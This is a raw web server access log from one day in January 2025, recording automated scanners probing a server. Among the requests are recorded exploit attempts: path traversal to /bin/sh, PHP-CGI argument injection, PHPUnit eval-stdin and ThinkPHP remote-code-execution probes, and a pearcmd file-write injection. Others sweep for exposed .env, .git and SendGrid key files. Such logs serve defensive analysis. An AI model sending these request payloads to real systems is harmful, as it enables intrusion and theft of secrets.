193.41.206.176 - - [13/Jan/2025:06:48:45 +0000] "GET /private/sendgrid_keys HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:45 +0000] "GET /private/sendgrid_config HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:45 +0000] "GET /backup/sendgrid_keys HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:45 +0000] "GET /backup/sendgrid_config HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:45 +0000] "GET /secrets/sendgrid_keys HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:45 +0000] "GET /secrets/sendgrid_config HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:45 +0000] "GET /config/sendgrid.py HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:45 +0000] "GET /settings/sendgrid_keys HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /settings/sendgrid_config HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /config/settings/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /config/settings/sendgrid_config.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /config/env/sendgrid.env HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /config/env/sendgrid_keys.env HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /instance/sendgrid_keys.py HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /sendgrid_keys.txt HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /sendgrid_keys.py HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /keys/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /api_keys/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /config/packages/sendgrid.yaml HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /config/secrets/prod/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /config/secrets/dev/sendgrid_keys.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /config/sendgrid.php HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /storage/sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /backup/sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /secrets/sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /config/sendgrid.js HTTP/1.1" 302 331 "-" "fasthttp"
193.41.206.176 - - [13/Jan/2025:06:48:46 +0000] "GET /private/sendgrid.json HTTP/1.1" 302 331 "-" "fasthttp"
185.189.182.234 - - [13/Jan/2025:06:52:43 +0000] "GET / HTTP/1.1" 400 523 "-" "-"
75.7.31.138 - - [13/Jan/2025:06:55:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
104.155.20.93 - - [13/Jan/2025:06:56:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
95.214.55.226 - - [13/Jan/2025:06:58:30 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [13/Jan/2025:07:11:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.2 - - [13/Jan/2025:07:46:16 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
193.34.212.75 - - [13/Jan/2025:07:47:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [13/Jan/2025:08:08:54 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
4.213.162.155 - - [13/Jan/2025:08:23:55 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:55 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:56 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:56 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:57 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:57 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:57 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:58 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:58 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:59 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:59 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:23:59 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:00 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:00 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:01 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:01 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:02 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:02 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:03 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:04 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:04 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:05 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:05 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:06 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:06 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:06 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:07 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:07 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:07 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:08 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:08 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:09 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:09 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:09 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:10 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:10 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:10 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:11 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:11 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:11 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:11 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:12 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:12 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:12 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
4.213.162.155 - - [13/Jan/2025:08:24:12 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
78.153.140.149 - - [13/Jan/2025:08:45:23 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:08:45:23 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:09:21:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:09:21:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
178.215.236.132 - - [13/Jan/2025:09:25:46 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01"
35.188.195.151 - - [13/Jan/2025:09:48:33 +0000] "\x16\x03\x01" 400 523 "-" "-"
35.188.195.151 - - [13/Jan/2025:09:48:35 +0000] "OPTIONS / HTTP/1.0" 200 1761 "-" "-"
95.214.55.226 - - [13/Jan/2025:09:53:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.34.212.75 - - [13/Jan/2025:10:15:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
176.120.207.147 - - [13/Jan/2025:10:49:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:10:57:23 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:10:57:23 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [13/Jan/2025:11:49:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.16.39.104 - - [13/Jan/2025:11:56:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
5.181.190.248 - - [13/Jan/2025:12:05:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
80.82.77.202 - - [13/Jan/2025:12:15:14 +0000] "\x16\x03\x02\x01o\x01" 400 523 "-" "-"
87.120.115.34 - - [13/Jan/2025:12:19:18 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.26"
78.153.140.149 - - [13/Jan/2025:12:25:41 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:12:25:42 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.242.226.10 - - [13/Jan/2025:12:40:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
184.105.139.67 - - [13/Jan/2025:12:55:51 +0000] "\x16\x03\x01" 400 523 "-" "-"
141.94.145.70 - - [13/Jan/2025:13:07:41 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Fedora; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"
78.153.140.149 - - [13/Jan/2025:13:18:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:13:18:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [13/Jan/2025:13:23:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [13/Jan/2025:13:38:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [13/Jan/2025:13:55:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.232 - - [13/Jan/2025:13:56:13 +0000] "\xff" 400 523 "-" "-"
51.159.99.244 - - [13/Jan/2025:14:15:18 +0000] "HEAD / HTTP/1.1" 200 296 "-" "curl/7.81.0"
78.153.140.149 - - [13/Jan/2025:14:30:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:14:30:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
31.13.224.222 - - [13/Jan/2025:14:32:31 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)"
112.184.40.41 - - [13/Jan/2025:15:28:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
18.118.135.178 - - [13/Jan/2025:15:46:16 +0000] "\x16\x03\x01" 400 523 "-" "-"
18.118.135.178 - - [13/Jan/2025:15:46:23 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
139.59.101.104 - - [13/Jan/2025:15:47:38 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
185.247.137.132 - - [13/Jan/2025:16:22:16 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.120.115.119 - - [13/Jan/2025:16:34:13 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
159.223.69.51 - - [13/Jan/2025:16:47:01 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.69.51 - - [13/Jan/2025:16:47:05 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
152.42.219.47 - - [13/Jan/2025:16:47:27 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [13/Jan/2025:16:47:30 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
78.153.140.149 - - [13/Jan/2025:16:56:36 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:16:56:36 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
195.3.223.55 - - [13/Jan/2025:16:58:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
4.255.99.81 - - [13/Jan/2025:17:03:12 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.149 - - [13/Jan/2025:17:06:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:17:06:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
194.50.16.36 - - [13/Jan/2025:17:24:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
5.181.190.248 - - [13/Jan/2025:17:25:53 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.16.39.104 - - [13/Jan/2025:17:29:52 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
211.225.83.129 - - [13/Jan/2025:17:31:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
178.215.236.132 - - [13/Jan/2025:17:45:24 +0000] "GET /.git/index HTTP/1.1" 302 350 "-" "Nokia7250/1.0 (3.14) Profile/MIDP-1.0 Configuration/CLDC-1.0"
121.146.8.84 - - [13/Jan/2025:17:52:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
47.251.73.124 - - [13/Jan/2025:18:04:27 +0000] "GET / HTTP/1.1" 200 1742 "-" "curl/7.64.1"
179.43.191.146 - - [13/Jan/2025:18:17:15 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [13/Jan/2025:18:48:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
194.61.31.102 - - [13/Jan/2025:19:12:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "python-requests/2.31.0"
78.153.140.149 - - [13/Jan/2025:19:13:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:19:13:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
2.57.122.205 - - [13/Jan/2025:19:22:46 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
2.57.122.205 - - [13/Jan/2025:19:22:46 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
2.57.122.205 - - [13/Jan/2025:19:22:46 +0000] "GET / HTTP/1.1" 200 947 "http://34.165.81.226/favicon.ico" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
193.34.212.75 - - [13/Jan/2025:19:37:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [13/Jan/2025:19:48:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [13/Jan/2025:20:07:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
49.156.40.1 - - [13/Jan/2025:20:26:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
20.118.69.83 - - [13/Jan/2025:20:32:01 +0000] "GET /manager/html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
62.84.100.218 - - [13/Jan/2025:20:41:21 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (CentOS; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0"
78.153.140.149 - - [13/Jan/2025:20:44:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [13/Jan/2025:20:44:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
